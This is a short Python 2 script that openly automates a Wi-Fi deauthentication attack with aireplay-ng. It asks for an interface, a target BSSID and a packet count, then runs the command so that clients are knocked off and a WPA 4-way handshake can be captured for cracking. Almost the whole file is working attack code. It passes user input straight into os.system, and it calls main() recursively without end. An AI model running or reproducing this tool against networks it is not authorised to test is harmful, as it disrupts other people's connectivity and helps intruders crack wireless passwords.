#!/usr/bin/env python
# coding=UTF-8

import os
import socket
import operator
from termcolor import colored
import sys


# sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

# aireplay-ng --deauth 100 -a 78:24:AF:ED:AB:A0 wlan1mon
# aireplay-ng --death <# packets> -a <broadcast MAC> <capture interface>
class aireplay_Parameters(object):

    def __init__(self, capture_Interface, capture_BSSID, amount_Deauth_Packets):
        self.capture_Interface = capture_Interface
        self.capture_BSSID = capture_BSSID
        self.amount_Deauth_Packets = amount_Deauth_Packets

    @classmethod
    def from_input(cls):
        return cls(
            str(raw_input("Enter the capture INTERFACE that was revealed to you in AIRMON: ")),
            str(raw_input("Enter the BSSID/Broadcast MAC Address of your TARGET: ")),
            str(raw_input("How many deauthorization packets do you want to send?: "))
        )

def main():
    print colored('Answer the following 3 questions to start the de-auth attack and capture the 4-way handshake for WPA routers','red','on_white')
    user_input = aireplay_Parameters.from_input()

    cmd_String = "aireplay-ng --deauth {0} -a {1} {2}".format(
        user_input.amount_Deauth_Packets,
        user_input.capture_BSSID,
        user_input.capture_Interface
    )
    print colored('Sending %s deauth packets to %s','red','on_white') % (user_input.amount_Deauth_Packets, user_input.capture_BSSID)
    print colored(cmd_String)
    os.system(cmd_String)
    print colored('Deauth packets complete, please check your terminal session containing Airodump, see that you captured the key on the top right corner','red','on_white')
    main()
    return
main()
